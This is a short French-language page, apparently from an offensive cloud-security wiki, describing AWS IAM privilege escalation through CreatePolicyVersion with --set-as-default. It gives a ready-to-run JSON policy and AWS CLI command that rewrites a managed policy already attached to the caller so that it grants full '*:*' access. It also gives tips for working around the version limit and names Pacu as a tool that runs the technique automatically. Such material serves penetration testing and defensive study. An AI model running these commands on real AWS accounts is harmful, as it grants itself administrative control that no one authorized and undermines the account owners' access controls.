---
title: "CreatePolicyVersion : publier une version de politique par défaut autorisant tout"
description: "iam:CreatePolicyVersion avec SetAsDefault pour publier une nouvelle version par défaut d'une politique managée qui accorde un accès complet."
keywords:
  - CreatePolicyVersion
  - managed policy
  - SetAsDefault
  - policy version
  - admin
---

# CreatePolicyVersion

Une politique managée conserve jusqu'à cinq versions, dont une marquée par défaut. `iam:CreatePolicyVersion` avec `--set-as-default` publie une nouvelle version et l'active en un seul appel : si vous pouvez modifier une politique managée déjà attachée à votre principal, vous la réécrivez donc pour tout autoriser.

## Accorder un accès complet

```bash
cat > admin.json <<'EOF'
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
EOF
aws iam create-policy-version \
  --policy-arn arn:aws:iam::<acct>:policy/<attached-policy> \
  --policy-document file://admin.json --set-as-default
```

Votre principal détient désormais `*:*` parce que la politique modifiée lui est attachée.

## Notes d'exploitation

- Visez une politique managée par le client déjà attachée à vous ; les politiques managées par AWS ne peuvent pas être modifiées.
- Si cinq versions existent déjà, supprimez-en d'abord une qui n'est pas par défaut (`delete-policy-version`), puis créez.
- `SetAsDefault` est le drapeau clé : sans lui, la version permissive existe mais reste inactive, ce qui correspond au cas [SetDefaultPolicyVersion](set-default-policy-version.md).

## Outils

- **AWS CLI** (`iam create-policy-version`).
- **Pacu** (`iam__privesc_scan`) : détecte et exécute cette voie.

## Références

- [Rhino Security Labs : élévation de privilèges AWS (CreatePolicyVersion)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [AWS : versions des politiques managées](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-versioning.html)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud : AWS](https://hackingthe.cloud/)
